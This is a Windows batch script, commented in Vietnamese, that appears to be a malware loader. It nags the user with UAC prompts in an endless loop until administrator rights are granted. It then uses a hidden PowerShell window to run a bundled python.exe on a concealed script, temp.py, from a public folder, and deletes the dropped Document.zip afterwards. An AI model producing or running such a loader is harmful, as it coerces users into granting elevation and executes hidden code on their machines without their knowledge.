@echo off
setlocal

set FLAGFILE=%TEMP%\admin.ok

:: Nếu đang chạy với quyền admin
net session >nul 2>&1
if %errorlevel% == 0 (
    echo > "%FLAGFILE%"  :: tạo file đánh dấu
    goto runMain
)

:: Nếu chưa có quyền admin và không có đối số 'elevated' → bắt đầu vòng lặp
if "%~1" neq "elevated" (
:askUAC
    del "%FLAGFILE%" >nul 2>&1
    echo [INFO] Đang yêu cầu quyền Administrator...
    powershell -WindowStyle Hidden -Command "Start-Process -FilePath '%~f0' -ArgumentList elevated -Verb RunAs"

    timeout /t 2 >nul

    if exist "%FLAGFILE%" (
        del "%FLAGFILE%" >nul 2>&1
        echo [OK] Đã có quyền admin. Dừng vòng lặp.
        exit /b
    )

    echo [WARN] Bạn đã bấm NO. Thử lại...
    goto askUAC
)

:: Nếu chạy với quyền admin nhưng không có quyền thật sự (rất hiếm)
echo [ERROR] Không thể nâng quyền.
exit /b

:runMain
echo [✓] Đang chạy với quyền Administrator!

@echo off && start /min powershell.exe -WindowStyle Hidden -Command "Start-Sleep -Seconds 1; C:\\Users\\Public\\Document\\python.exe C:\\Users\\Public\\Document\\Lib\\temp.py; del C:/Users/Public/Document.zip" && exit

pause
exit /b

